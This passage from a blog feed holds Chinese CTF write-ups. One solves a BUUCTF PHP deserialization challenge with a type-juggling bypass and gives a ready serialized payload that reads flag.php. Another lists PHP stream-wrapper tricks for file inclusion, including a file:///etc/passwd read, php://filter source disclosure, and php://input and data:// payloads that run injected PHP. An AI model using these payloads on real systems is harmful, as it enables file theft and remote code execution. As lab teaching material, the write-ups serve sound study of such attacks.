punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>__construct()</strong></p><blockquote><p>ÊûÑÈÄ†ÂáΩÊï∞Ôºàconstructor methodÔºå‰πüÁß∞‰∏∫ÊûÑÈÄ†Âô®ÔºâÊòØÁ±ª‰∏≠ÁöÑ‰∏ÄÁßçÁâπÊÆäÂáΩÊï∞ÔºåÂΩì‰ΩøÁî® new ÂÖ≥ÈîÆÂ≠óÂÆû‰æãÂåñ‰∏Ä‰∏™ÂØπË±°Êó∂ÔºåÊûÑÈÄ†ÂáΩÊï∞Â∞Ü‰ºöËá™Âä®Ë∞ÉÁî®„ÄÇ</p></blockquote><p><strong>__destruct</strong></p><blockquote><p>__destruct() &#x2F;&#x2F;ÂØπË±°Ë¢´ÈîÄÊØÅÊó∂Ëß¶Âèë</p><p>__destruct() ÊòØ PHP Èù¢ÂêëÂØπË±°ÁºñÁ®ãÁöÑ‰∏Ä‰∏™ÈáçË¶ÅÁöÑÈ≠îÊ≥ïÂáΩÊï∞ÔºåËØ•ÂáΩÊï∞‰ºöÂú®Á±ªÁöÑ‰∏Ä‰∏™ÂØπË±°Ë¢´Âà†Èô§Êó∂Ëá™Âä®Ë∞ÉÁî®„ÄÇ<br>Êàë‰ª¨ÂèØ‰ª•Âú®ËØ•ÂáΩÊï∞‰∏≠Ê∑ªÂä†‰∏Ä‰∫õÈáäÊîæËµÑÊ∫êÁöÑÊìç‰ΩúÔºåÊØîÂ¶ÇÂÖ≥Èó≠Êñá‰ª∂„ÄÅÂÖ≥Èó≠Êï∞ÊçÆÂ∫ìÈìæÊé•„ÄÅÊ∏ÖÁ©∫‰∏Ä‰∏™ÁªìÊûúÈõÜÁ≠â</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>  <span class="token comment">//protected: Âèó‰øùÊä§Á±ªÂûã</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊÄªÁöÑÊù•ËØ¥Ë¶ÅÊü•Áúãfilename‰∏∫<strong>flag.php</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ÊÑèÊÄùÂ∞±ÊòØÂè™ÂÖÅËÆ∏ÂèñASCIIÁ†Å‰∏∫32~125ÁöÑÂ≠óÁ¨¶</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>Ëøô‰∏™È≠îÊ≥ïÂáΩÊï∞‰∏≠ÂØπopÁöÑÂÄºËøõË°å<strong>Âº∫Á±ªÂûãÂà§Êñ≠</strong></p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//opÁ≠â‰∫é1ÔºåÁªô‰∫àÂÜôÊñá‰ª∂ÊùÉÈôê</span>           <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//opÁ≠â‰∫é2ÔºåÁªô‰∫àËØªÊñá‰ª∂ÊùÉÈôê</span>           <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>           <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ÂØπopÂÄºËøõË°å<strong>Âº±Á±ªÂûãÂà§Êñ≠</strong>ÔºåÁî±‰∫éÊàë‰ª¨Âè™ÈúÄË¶ÅËØªÂá∫flag„ÄÇop&#x3D;2Âç≥ÂèØ„ÄÇ‰ªéÂ∏àÂÇÖ‰ª¨ÁöÑÊñáÁ´†‰∏≠‰∫ÜËß£Âà∞Âú®php7.1++‰∏≠ÂØπÂ±ûÊÄßÁ±ªÂûã‰∏çÊïèÊÑüÔºåÊú¨Âú∞Â∫èÂàóÂåñÁöÑÊó∂ÂÄôÂ∞ÜÂ±ûÊÄßÊîπ‰∏∫publicËøõË°åÁªïËøáÂç≥ÂèØ</p></blockquote><p>ÈÇ£‰πàËØ•Â¶Ç‰ΩïÁªïËøáÂë¢?ÂΩì**$op&#x3D;2**Êó∂</p><blockquote><p>op &#x3D;&#x3D;&#x3D; ‚Äú2‚Äù‰∏∫ÂÅáÔºåop &#x3D;&#x3D; ‚Äú2‚Äù‰∏∫Áúü„ÄÇop &#x3D;&#x3D;&#x3D; ‚Äú2‚Äù‰∏∫ÂÅá,ÈÇ£Â∞±ÁªïËøá__destruct()„ÄÇÂÜôÁùÄÂ∞±ÊúâreadÊùÉÈôê‰∫Ü„ÄÇ</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$op</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>  <span class="token comment">//protected: Âèó‰øùÊä§Á±ªÂûã</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span><span class="token comment">//ÂÄºÈöèÊÑè</span>    <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$b</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂæóÂà∞<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/364916f0203944bda37d24a09796566b.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/f495a0667a374112af7a7e1de5d21e5a.png" alt="2"><br>ÂæóÂà∞flag„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF‰∏≠Â∏∏Áî®ÁöÑphp‰º™ÂçèËÆÆÊÄªÁªì</title>
      <link href="/2022/12/29/CTF%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/"/>
      <url>/2022/12/29/CTF%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ÊÄªËßà"><a href="#ÊÄªËßà" class="headerlink" title="ÊÄªËßà"></a>ÊÄªËßà</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">php<span class="token punctuation">:</span><span class="token operator">//</span> ‚Äî ËÆøÈóÆÂêÑ‰∏™ËæìÂÖ•<span class="token operator">/</span>ËæìÂá∫ÊµÅÔºàI<span class="token operator">/</span>O streamsÔºâ<span class="token builtin">file</span><span class="token punctuation">:</span><span class="token operator">//</span> ‚Äî ËÆøÈóÆÊú¨Âú∞Êñá‰ª∂Á≥ªÁªüphar<span class="token punctuation">:</span><span class="token operator">//</span> ‚Äî PHP ÂΩíÊ°£zlib<span class="token punctuation">:</span><span class="token operator">//</span> ‚Äî ÂéãÁº©ÊµÅdata<span class="token punctuation">:</span><span class="token operator">//</span> ‚Äî Êï∞ÊçÆÔºàRFC <span class="token number">2397</span>Ôºâhttp<span class="token punctuation">:</span><span class="token operator">//</span> ‚Äî ËÆøÈóÆ HTTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> ÁΩëÂùÄftp<span class="token punctuation">:</span><span class="token operator">//</span> ‚Äî ËÆøÈóÆ FTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> URLsglob<span class="token punctuation">:</span><span class="token operator">//</span> ‚Äî Êü•ÊâæÂåπÈÖçÁöÑÊñá‰ª∂Ë∑ØÂæÑÊ®°Âºèssh2<span class="token punctuation">:</span><span class="token operator">//</span> ‚Äî Secure Shell <span class="token number">2</span>rar<span class="token punctuation">:</span><span class="token operator">//</span> ‚Äî RARogg<span class="token punctuation">:</span><span class="token operator">//</span> ‚Äî Èü≥È¢ëÊµÅexpect<span class="token punctuation">:</span><span class="token operator">//</span> ‚Äî Â§ÑÁêÜ‰∫§‰∫íÂºèÁöÑÊµÅ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><p>Áî®‰∫éËÆøÈóÆÊú¨Âú∞Êñá‰ª∂Á≥ªÁªüÔºåÂπ∂‰∏î‰∏çÂèó<code>allow_url_fopen</code>Ôºå<code>allow_url_include</code>ÂΩ±Âìç<br> <code>file://</code>ÂçèËÆÆ‰∏ªË¶ÅÁî®‰∫éËÆøÈóÆÊñá‰ª∂(ÁªùÂØπË∑ØÂæÑ„ÄÅÁõ∏ÂØπË∑ØÂæÑ‰ª•ÂèäÁΩëÁªúË∑ØÂæÑ)<br> ÊØîÂ¶ÇÔºö<code>http://www.xx.com?file=file:///etc/passsword</code></p><h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><p>Âú®<code>allow_url_fopen</code>Ôºå<code>allow_url_include</code>ÈÉΩÂÖ≥Èó≠ÁöÑÊÉÖÂÜµ‰∏ãÂèØ‰ª•Ê≠£Â∏∏‰ΩøÁî®<br> <code>php://</code>‰ΩúÁî®‰∏∫ËÆøÈóÆËæìÂÖ•ËæìÂá∫ÊµÅ</p><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>ËØªÂèñÊ∫ê‰ª£Á†ÅÂπ∂ÁºñÁ†ÅËæìÂá∫Ôºå‰æãÂ¶ÇÔºö<br> <code>http://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=[Êñá‰ª∂Âêç]ÔºàÈíàÂØπphpÊñá‰ª∂ÈúÄË¶Åbase64ÁºñÁ†ÅÔºâ</code><br> ËØ¥ÊòéÔºö<br> <code>resource=&lt;Ë¶ÅËøáÊª§ÁöÑÊï∞ÊçÆÊµÅ&gt;</code> Ëøô‰∏™ÂèÇÊï∞ÊòØÂøÖÈ°ªÁöÑ„ÄÇÂÆÉÊåáÂÆö‰∫Ü‰Ω†Ë¶ÅÁ≠õÈÄâËøáÊª§ÁöÑÊï∞ÊçÆÊµÅ<br> <code>read=&lt;ËØªÈìæÁöÑÁ≠õÈÄâÂàóË°®&gt;</code> ËØ•ÂèÇÊï∞ÂèØÈÄâ„ÄÇÂèØ‰ª•ËÆæÂÆö‰∏Ä‰∏™ÊàñÂ§ö‰∏™ËøáÊª§Âô®ÂêçÁß∞Ôºå‰ª•ÁÆ°ÈÅìÁ¨¶Ôºà|ÔºâÂàÜÈöî„ÄÇ<br> <code>write=&lt;ÂÜôÈìæÁöÑÁ≠õÈÄâÂàóË°®&gt;</code>ËØ•ÂèÇÊï∞ÂèØÈÄâ„ÄÇÂèØ‰ª•ËÆæÂÆö‰∏Ä‰∏™ÊàñÂ§ö‰∏™ËøáÊª§Âô®ÂêçÁß∞Ôºå‰ª•ÁÆ°ÈÅìÁ¨¶Ôºà|ÔºâÂàÜÈöî„ÄÇ<br> <code>&lt;Ôºõ‰∏§‰∏™ÈìæÁöÑÁ≠õÈÄâÂàóË°®&gt;</code> ‰ªª‰ΩïÊ≤°Êúâ‰ª• read&#x3D; Êàñ write&#x3D; ‰ΩúÂâçÁºÄ ÁöÑÁ≠õÈÄâÂô®ÂàóË°®‰ºöËßÜÊÉÖÂÜµÂ∫îÁî®‰∫éËØªÊàñÂÜôÈìæ„ÄÇ</p><h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p><code>php://input</code>ÊâßË°åpostÊï∞ÊçÆ‰∏≠ÁöÑ‰ª£Á†ÅÔºö<br> ‰æãÂ¶ÇÔºö<br> <code>http://127.0.0.1/cmd.php?cmd=php://input</code><br> POSTÊï∞ÊçÆÔºö<code>&lt;?php phpinfo()?&gt;</code><br> Ê≥®ÊÑèÔºö<br> ÂΩì<code>enctype=&quot;multipart/form-data&quot;ÁöÑÊó∂ÂÄô</code> php:&#x2F;&#x2F;input&#96; ÊòØÊó†ÊïàÁöÑ</p><h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><p>Ëá™PHP&gt;&#x3D;5.2.0Ëµ∑ÔºåÂèØ‰ª•‰ΩøÁî®data:&#x2F;&#x2F;Êï∞ÊçÆÊµÅÂ∞ÅË£ÖÂô®Ôºå‰ª•‰º†ÈÄíÁõ∏Â∫îÊ†ºÂºèÁöÑÊï∞ÊçÆ„ÄÇÈÄöÂ∏∏ÂèØ‰ª•Áî®Êù•ÊâßË°åPHP‰ª£Á†Å„ÄÇ‰∏ÄËà¨ÈúÄË¶ÅÁî®Âà∞base64ÁºñÁ†Å‰º†Ëæì<br> ÊØîÂ¶ÇÔºö<br> ÈÄöËøádata:&#x2F;&#x2F;text&#x2F;plainÂçèËÆÆÊù•ËøõË°åÊºèÊ¥ûÂà©Áî®„ÄÇ<br> <code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code><br> <code>url=data://text/plain,&lt;?php print_r(glob(&quot;*&quot;)); ?&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>‰ºòË¥®ÂõæÂ∫ä</title>
      <link href="/2022/12/28/%E4%BC%98%E8%B4%A8%E5%9B%BE%E5%BA%8A/"/>
      <url>/2022/12/28/%E4%BC%98%E8%B4%A8%E5%9B%BE%E5%BA%8A/</url>
      
